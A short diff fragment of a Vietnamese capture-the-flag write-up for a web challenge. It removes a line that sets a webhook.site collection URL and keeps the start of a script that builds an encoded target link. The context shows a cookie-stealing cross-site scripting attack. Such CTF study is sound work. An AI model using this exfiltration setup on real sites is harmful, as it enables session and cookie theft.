@@ -77,7 +77,6 @@ Khi script chạy trong origin `localhost:1337`, nó đọc được `document.c
 
 ```bash
 CHALL='https://boiled-meatball-stuffed-with-braised-truffle-oil-0b6i.gpn24.ctf.kitctf.de'
-WEBHOOK='https://webhook.site/8eafb00c-ff64-4eaa-a987-16bbabf9b1f3'
 
 TARGET=$(python3 - <<'PY'
 from urllib.parse import quote, quote_from_bytes
